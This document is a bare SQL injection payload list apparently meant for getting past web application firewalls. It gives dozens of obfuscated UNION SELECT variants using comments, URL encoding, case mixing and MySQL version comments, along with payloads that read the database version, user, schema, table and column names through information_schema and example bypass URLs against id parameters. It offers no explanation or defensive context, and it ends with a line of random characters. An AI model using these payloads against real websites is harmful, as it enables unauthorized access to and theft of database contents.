# Sql-Injection


/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
9999' or 1=9 union select null, version() #
9999' or 1=9 union select null, user() #
9999' or 1=9 union select null, database() #
9999' or 1=9 union select null, concat(table_name,0x0a,column_name)
from information_schema.columns where table_name='users' #
SELECT * from table where id = 1 union select 1,2,3
/*!50000%55nIoN*/ /*!50000%53eLeCt*/
%55nion(%53elect 1,2,3) — -
+union+distinctROW+select+
/**//*!12345UNION SELECT*//**/
/**//*!50000UNION SELECT*//**/
/**/UNION/**//*!50000SELECT*//**/
/*!50000UniON SeLeCt*/
union /*!50000%53elect*/
+#uNiOn+#sEleCt
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/*!%55NiOn*/ /*!%53eLEct*/
/*!u%6eion*/ /*!se%6cect*/
+un/**/ion+se/**/lect
uni%0bon+se%0blect
%2f**%2funion%2f**%2fselect
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
REVERSE(noinu)+REVERSE(tceles)
/* — */union/* — */select/* — */
union (/*!/**/ SeleCT */ 1,2,3)
/*!union*/+/*!select*/
union+/*!select*/
/**/union/**/select/**/
+%2F**/+Union/*!select*/
/**//*!union*//**//*!select*//**/
/*!uNIOn*/ /*!SelECt*/
+union+distinct+select+
+union+distinctROW+select+
uNiOn aLl sElEcT
UNIunionON+SELselectECT
/**/union/*!50000select*//**/
0%a0union%a0select%09
%0Aunion%0Aselect%0A
%55nion/**/%53elect
uni<on all=”” sel=””>/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
%0A%09UNION%0CSELECT%10NULL%
/*!union*//* — *//*!all*//* — *//*!select*/
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+UnIoN/*&a=*/SeLeCT/*&a=*/
union+sel%0bect
+uni*on+sel*ect+
+#1q%0Aunion all#qa%0A#%0Aselect
union(select (1),(2),(3),(4),(5))
UNION(SELECT(column)FROM(table))
%23xyz%0AUnIOn%23xyz%0ASeLecT+
%23xyz%0A%55nIOn%23xyz%0A%53eLecT+
union(select(1),2,3)
union (select 1111,2222,3333)
uNioN (/*!/**/ SeleCT */ 11)
union (select 1111,2222,3333)
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/
+%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/
+%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+
/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/
/union\sselect/g
/union\s+select/i
/*!UnIoN*/SeLeCT
+UnIoN/*&a=*/SeLeCT/*&a=*/
+uni>on+sel>ect+
+(UnIoN)+(SelECT)+
+(UnI)(oN)+(SeL)(EcT)
+’UnI”On’+’SeL”ECT’
+uni on+sel ect+
+/*!UnIoN*/+/*!SeLeCt*/+
/*!u%6eion*/ /*!se%6cect*/
uni%20union%20/*!select*/%20
union%23aa%0Aselect
/**/union/*!50000select*/
/*union*/union/*select*/select+
/*uni X on*/union/*sel X ect*/
+un/**/ion+sel/**/ect+
+UnIOn%0d%0aSeleCt%0d%0a
UNION/*&test=1*/SELECT/*&pwn=2*/
un?<ion sel=””>+un/**/ion+se/**/lect+
+UNunionION+SEselectLECT+
+uni%0bon+se%0blect+
%252f%252a*/union%252f%252a /select%252f%252a*/
/%2A%2A/union/%2A%2A/select/%2A%2A/
%2f**%2funion%2f**%2fselect%2f**%2f
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
*!UnIoN*/SeLecT+
information_schema.tables
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA() — -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA() — -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database() — -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database() — -
/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table

concat()
CoNcAt()
concat()
CON%08CAT()
CoNcAt()
%0AcOnCat()
/**//*!12345cOnCat*/
/*!50000cOnCat*/(/*!*/)
unhex(hex(concat(table_name)))
unhex(hex(/*!12345concat*/(table_name)))
unhex(hex(/*!50000concat*/(table_name)))

group_concat()
/*!group_concat*/()
gRoUp_cOnCAt()
group_concat(/*!*/)
group_concat(/*!12345table_name*/)
group_concat(/*!50000table_name*/)
/*!group_concat*/(/*!12345table_name*/)
/*!group_concat*/(/*!50000table_name*/)
/*!12345group_concat*/(/*!12345table_name*/)
/*!50000group_concat*/(/*!50000table_name*/)
/*!GrOuP_ConCaT*/()/*!12345GroUP_ConCat*/()
/*!50000gRouP_cOnCaT*/()
/*!50000Gr%6fuP_c%6fnCAT*/()
unhex(hex(group_concat(table_name)))
unhex(hex(/*!group_concat*/(/*!table_name*/)))
unhex(hex(/*!12345group_concat*/(table_name)))
unhex(hex(/*!12345group_concat*/(/*!table_name*/)))
unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))
unhex(hex(/*!50000group_concat*/(table_name)))
unhex(hex(/*!50000group_concat*/(/*!table_name*/)))
unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))
convert(group_concat(table_name)+using+ascii)
convert(group_concat(/*!table_name*/)+using+ascii)
convert(group_concat(/*!12345table_name*/)+using+ascii)
convert(group_concat(/*!50000table_name*/)+using+ascii)
CONVERT(group_concat(table_name)+USING+latin1)
CONVERT(group_concat(table_name)+USING+latin2)
CONVERT(group_concat(table_name)+USING+latin3)
CONVERT(group_concat(table_name)+USING+latin4)

CONVERT(group_concat(table_name)+USING+latin5)


Bypass- 
 /?id=1+union+select+1,2,3/*
/?id=1/*union*/union/*select*/select+1,2,3/*
 index.php?id=1/*uni X on*/union/*sel X ect*/select+1,2,3/*
 /?id=1+union+select+1,2,3/*
 /?id=1+un/**/ion+sel/**/ect+1,2,3--
 SQL=" select key from table where id= "+Request.QueryString("id")
 /?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users
+UNunionION+SEselectLECT+1,2,3--
+uni%0bon+se%0blect+1,2,3--

%55nion(%53elect) union%20distinct%20select union%20%64istinctRO%57%20select union%2053elect %23?%0auion%20?%23?%0aselect %23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect %55nion %53eLEct u%6eion se%6cect unio%6e %73elect unio%6e%20%64istinc%74%20%73elect uni%6fn distinct%52OW s%65lect %75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%7

/**/ORDER/**/BY/**/
/*!order*/+/*!by*/
/*!ORDER BY*/
/*!50000ORDER BY*/
/*!50000ORDER*//**//*!50000BY*/
/*!12345ORDER*/+/*!BY*//**/ORDER/**/BY/**/


7)44rxkTT58i5744y=y'TL,x3FiHmp42
